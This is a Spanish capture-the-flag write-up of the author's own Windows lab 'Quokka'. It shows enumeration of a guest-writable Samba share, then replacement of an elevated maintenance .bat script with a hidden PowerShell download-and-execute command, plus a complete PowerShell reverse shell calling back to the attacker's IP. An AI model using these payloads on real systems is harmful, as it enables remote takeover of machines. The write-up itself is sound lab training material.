---

title: "TheHackersLabs - Quokka"
description: "Análisis de vulnerabilidades en IIS y Samba en un entorno Windows Server."
publishDate: 2024-10-29
category: "ctf"
type: "created-ctf"
difficulty: "easy"
tags: ["thehackerslabs", "windows", "samba", "reverse-shell", "iis", "powershell"]
readingTime: "5 min"

---

Este CTF fue creado por mí, Oscar Sanchez (@Oskitaar90), como mi primer laboratorio sobre Windows para la comunidad de TheHackersLabs.

## Información del Challenge

* 📛 **Nombre**: Quokka
* 📈 **Dificultad**: Principiante
* 💻 **SO**: Windows Server
* 👨‍💻 **Creador**: @Oskitaar90

## Análisis técnico

* Servicios expuestos: IIS (80), Samba (445)
* Vulnerabilidad principal: Permisos de escritura con usuario guest en recurso Samba
* Vector de explotación: Modificación de script `.bat` ejecutado con privilegios elevados

## Desarrollo de la solución

### 🔍 Descubrimiento de IP

```bash
sudo arp-scan -I eth0 --localnet | grep -i "08:00:27:c7:7e:d7"
```

Resultado:

```
192.168.1.48    08:00:27:c7:7e:d7       (Unknown)
```

### 🔎 Escaneo de puertos

```bash
sudo nmap -sSCV -p- -Pn -n --min-rate 5000 192.168.1.48
```

Servicios detectados:

```
80/tcp   http       Microsoft IIS httpd 10.0
135/tcp  msrpc      Microsoft Windows RPC
139/tcp  netbios-ssn
445/tcp  microsoft-ds
5357/tcp http       Microsoft HTTPAPI 2.0
5985/tcp http       Microsoft HTTPAPI 2.0
49668/tcp msrpc
```

### 🌐 Análisis Web

Accediendo al puerto 80, se observa un blog. Una de las entradas menciona a Daniel y Luis revisando un servicio con privilegios. Esta pista apunta a revisar Samba.

### 📁 Enumeración Samba

```bash
netexec smb 192.168.1.48 -u 'guest' -p '' --shares
```

Resultado:

```
Shared  READ,WRITE
```

### 📂 Exploración con smbclient

```bash
smbclient -U guest% //192.168.1.48/Shared
```

Ruta encontrada:

```
\Proyectos\Quokka\Código\mantenimiento.bat
```

### 🛠️ Explotación del Script .bat

Archivo con comentario:

```
:: Pista: Este script se ejecuta con permisos elevados.
```

Modificamos el script:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.36:8000/shell.ps1')"
exit
```

### 🧠 Reverse Shell en PowerShell (shell.ps1)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.36", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()
```

### 🖥️ Levantando servidor y listener

```bash
python3 -m http.server 8000
nc -lvnp 4444
```

## Flag

```powershell
PS C:\Windows\system32> whoami
win-bfbav3ddg0n\administrador
PS C:\Windows\system32>
```

## Lecciones aprendidas

* Los permisos de escritura en recursos compartidos pueden comprometer sistemas
* Nunca ejecutar scripts de mantenimiento sin validar su integridad y permisos
* PowerShell puede ser explotado fácilmente si no se aplican restricciones
* IIS por sí solo no tenía vulnerabilidades, pero sirvió como vector informativo

## Referencias

* [Netexec (antes CrackMapExec)](https://github.com/byt3bl33d3r/CrackMapExec)
* [Samba Permissions and Shares](https://wiki.samba.org/)
* [PowerShell Reverse Shell](https://book.hacktricks.xyz/pentesting-web/pentesting-web-shells#powershell)
* [Hardening Windows SMB](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server)
* [IIS Security Best Practices](https://learn.microsoft.com/en-us/iis/manage/security-baselines/iis-security-best-practices)
